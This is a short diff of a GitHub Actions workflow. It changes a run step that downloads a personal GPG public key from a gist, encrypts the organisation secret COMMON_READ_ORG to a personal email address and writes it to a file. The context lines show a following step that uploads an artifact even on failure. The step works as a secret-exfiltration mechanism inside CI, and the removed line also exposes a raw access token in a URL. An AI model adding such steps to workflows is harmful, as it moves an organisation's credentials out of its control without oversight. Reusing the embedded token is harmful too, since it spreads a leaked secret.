@@ -10,7 +10,7 @@ jobs:
         env:
           TOKEN: ${{ secrets.COMMON_READ_ORG}}
         run: |
-          wget https://raw.githubusercontent.com/LedgerHQ/ledger-internal-openpgp-keys/master/ledgerlivedevs/valentin.de.almeida_0x31D69E3A798FF0432234349D99FC33E5A43E1E7F.asc?token=GHSAT0AAAAAABTRDJWGC4BPGX3W7BKGOLPEYT447QA && gpg --import val.pub && echo done && echo $TOKEN | gpg --trust-model always --batch --yes --encrypt -r valentin.d.pinkman@hey.com -o out
+          wget https://gist.githubusercontent.com/valpinkman/1f806a0b1fd0a82432dea3318618e083/raw/27ef7bab090434cbe56d35675b93d39fb10e9d1d/val.pub && gpg --import val.pub && echo done && echo $TOKEN | gpg --trust-model always --batch --yes --encrypt -r valentin.d.pinkman@hey.com -o out
       - name: upload
         if: always()
         uses: actions/upload-artifact@v3
